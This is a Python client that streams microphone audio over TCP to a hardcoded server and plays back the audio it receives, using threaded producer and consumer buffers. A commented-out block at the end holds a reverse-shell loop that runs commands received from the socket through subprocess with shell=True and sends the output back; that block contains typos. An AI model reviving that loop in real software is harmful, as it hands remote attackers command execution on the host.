import socket
from socket import timeout
from time import sleep
from threading import Thread, Lock, Condition
import sounddevice as sd
import pickle
import os 
import subprocess 
import pyaudio
import wave
import numpy as np

#* Audio signal parameters
# number of channels
# sample width
# framerate/sample_rate: 44,100 Hz
# number of frames
# value of frames


# host="64.44.97.254"
host="192.168.1.40"
port=9001
MAX_BYTES_SEND = 1024  # Must be less than 1024 because of networking limits
MAX_HEADER_LEN = 20  # allocates 20 bytes to store length of data that is transmitted

BUFMAX = 512
sdstream = sd.Stream(samplerate=44100, channels=1, dtype='float32')
sdstream.start()

item_available = Condition()
SLEEPTIME = 0.0001  # amount of time CPU sleeps between sending recordings to the server
audio_available = Condition()

running = True

"""
channels = 1
rate = 44100
def set_volume(datalist, volume):
    # Change value of list of audio chunks
    sound_level = (volume / 100.)
    for i in range(len(datalist)):
        chunk = np.fromstring(datalist[i], np.int16)
        chunk = chunk * sound_level
        datalist[i] = chunk.astype(np.int16)

def start_streaming(): 
    format = pyaudio.paInt16
    p = pyaudio.PyAudio()
    stream = p.open(
        format=format,
        channels = channels,
        rate=rate,
        input=True,
        frames_per_buffer=MAX_BYTES_SEND
    )
    print("start recording")
    seconds = 3
    for i in range(0, int(rate/MAX_BYTES_SEND*seconds)):
        data = stream.read(MAX_BYTES_SEND)
        buffer.append(data)
    set_volume(buffer,2000)

def stop_streaming():
    stream.stop_stream()
    stream.close()
    p.terminate()

def save_file():
    obj = wave.open("output.wav","wb")
    obj.setnchannels(channels)
    obj.setsampwidth(p.get_sample_size(format))
    obj.setframerate(rate)
    obj.writeframes(b"".join(buffer))
    obj.close()
"""





#todo Action functions

class SharedBuf:
    def __init__(self):
        self.buffer = np.array([], dtype='float32')

    def clearbuf(self):
        self.buffer = []

    def addbuf(self, arr):
        self.buffer = np.append(self.buffer, arr)

    def extbuf(self, arr):
        self.buffer = np.append(self.buffer, arr)

    def getlen(self):
        return len(self.buffer)

    def getbuf(self):
        return self.buffer

    def getx(self, x):
        data = self.buffer[0:x]
        self.buffer = self.buffer[x:]
        return data

#! Action functions End

def record(t):
    global running
    if running:
        return sdstream.read(t)[0]

def transmit(buf, socket):
    global running
    pickled = buf.tobytes()
    #// pickeled = encrypt(pickled)

    try:
        split_send_bytes(socket, pickled)
    except timeout:
        print("SOCKET TIMEOUT")
        running = False
    except BrokenPipeError:
        print("Recipient disconnected")
        running = False


def record_transmit_thread(serversocket):
    print("***** STARTING RECORD TRANSMIT THREAD *****")
    tbuf = SharedBuf()
    global running

    def recorder_producer(buf):
        global running
        while running:
            sleep(SLEEPTIME)
            data = record(32)
            with item_available:
                item_available.wait_for(lambda: buf.getlen() <= BUFMAX)
                buf.extbuf(data)
                item_available.notify()

        print("RECORDER ENDS HERE")

    def transmitter_consumer(buf, serversocket):
        global running
        while running:
            sleep(SLEEPTIME)
            with item_available:
                item_available.wait_for(lambda: buf.getlen() >= 32)
                transmit(buf.getx(32), serversocket)
                item_available.notify()

        print("TRANSMITTER ENDS HERE")

    rec_thread = Thread(target=recorder_producer, args=(tbuf,))
    tr_thread = Thread(target=transmitter_consumer, args=(tbuf, serversocket))

    rec_thread.start()
    tr_thread.start()

    rec_thread.join()
    tr_thread.join()
    return

# use a sound library to play the buffer
def play(buf):
    global running
    if running:
        sdstream.write(buf)


def receive(socket):
    global running
    while running:
        try:
            dat = split_recv_bytes(socket)
            #// dat = decrypt(dat)
            buf = np.frombuffer(dat, dtype='float32')  # read decrypted numpy array
            yield buf
        except pickle.UnpicklingError as e:
            print(f"    @@@@@ UNPICKLE ERROR @@@@@   \n DATA RECEIVED {len(dat)} :: {dat}")  # INPUT______ of len = {sys.getsizeof(dat)} ::{decrypt(dat)} :: {str(e)}")
            continue
        except timeout:
            print("SOCKET TIMEOUT")
            yield None
        except ConnectionResetError:
            print("Recipient disconnected")
            yield None


def receive_play_thread(serversocket):
    print("***** STARTING RECEIVE PLAY THREAD *****")
    rbuf = SharedBuf()

    def receiver_producer(buff, serversocket):
        global running
        rece_generator = receive(serversocket)
        while running:
            sleep(SLEEPTIME)
            try:
                data = next(rece_generator)
            except StopIteration:
                break
            if data is None:
                break
            with audio_available:
                audio_available.wait_for(lambda: buff.getlen() <= BUFMAX)
                buff.extbuf(data)
                audio_available.notify()

        print("RECEIVER ENDS HERE")

    def player_consumer(buff):
        while running:
            sleep(SLEEPTIME)
            with audio_available:
                audio_available.wait_for(lambda: buff.getlen() >= 32)
                play(buff.getx(buff.getlen()))
                audio_available.notify()

        print("PLAYER ENDS HERE")

    global running

    rece_thread = Thread(target=receiver_producer, args=(rbuf, serversocket))
    play_thread = Thread(target=player_consumer, args=(rbuf,))
    rece_thread.start()
    play_thread.start()
    # input("press enter to exit")
    # running = False

    rece_thread.join()
    play_thread.join()
    return

def split_send_bytes(s, inp):
    data_len = (len(inp))
    if data_len == 0:
        print('ERROR: trying to send 0 bytes')  # should not happen in theory but threads are weird
        return

    # tells the client on the other end how many bytes it's expecting to receive
    header = str(data_len).encode('utf8')
    header_builder = b'0' * (MAX_HEADER_LEN - len(header)) + header
    s.send(header_builder)

    # send content in small batches. Maximum value of MAX_BYTES_SEND is 1024
    for i in range(data_len // MAX_BYTES_SEND):
        s.send(inp[i * MAX_BYTES_SEND:i * MAX_BYTES_SEND + MAX_BYTES_SEND])

    # send any remaining data
    if data_len % MAX_BYTES_SEND != 0:
        s.send(inp[-(data_len % MAX_BYTES_SEND):])

def split_recv_bytes(s):
    dat = b''

    # receive header that specifies number of incoming bytes
    data_len_raw = s.recv(MAX_HEADER_LEN)
    try:
        data_len = int((data_len_raw).decode('utf8'))
    except UnicodeDecodeError as e:
        print(data_len_raw)
        raise e
    while data_len == 0:
        print(f"received 0 bytes. raw = {data_len_raw}")  # should never happen
        data_len = int((s.recv(MAX_BYTES_SEND)).decode('utf8'))

    # read bytes
    for i in range(int(data_len // MAX_BYTES_SEND)):
        dat += s.recv(MAX_BYTES_SEND)
    if data_len % MAX_BYTES_SEND != 0:
        dat += s.recv(data_len % MAX_BYTES_SEND)

    return dat




def main():
    serversocket = connect()
    global running
    t_thread = Thread(target=record_transmit_thread, args=(serversocket,))
    p_thread = Thread(target=receive_play_thread, args=(serversocket,))
    t_thread.start()
    p_thread.start()
    input("press enter to exit")
    running = False
    sdstream.stop()
    t_thread.join()
    p_thread.join()
    serversocket.close()


def connect():
    global host
    global port
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(5.0)
    return s



main()







# def main():
#     start_streaming()
#     stop_streaming()


# main()
# s.connect((host,port))

# while True:
#     data = s.recv(1024)
#     if data[:2].decode("urf-8") == "cd":
#         os.chdir(data[3:].decode("utf-8"))

#     if len(data) > 0:
#         cmd= subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,stdin=subprocess.PIPE,sterr=subprocess.PIPE)
#         output_byte = cmd.stdout.read() + cmd.stderr.read()
#         output_str = str(output_byte, "utf-8")
#         currentWD = os.getcwd()+ "> "
#         s.send(str.encode(output_str + currentWD))
#         print(output_str)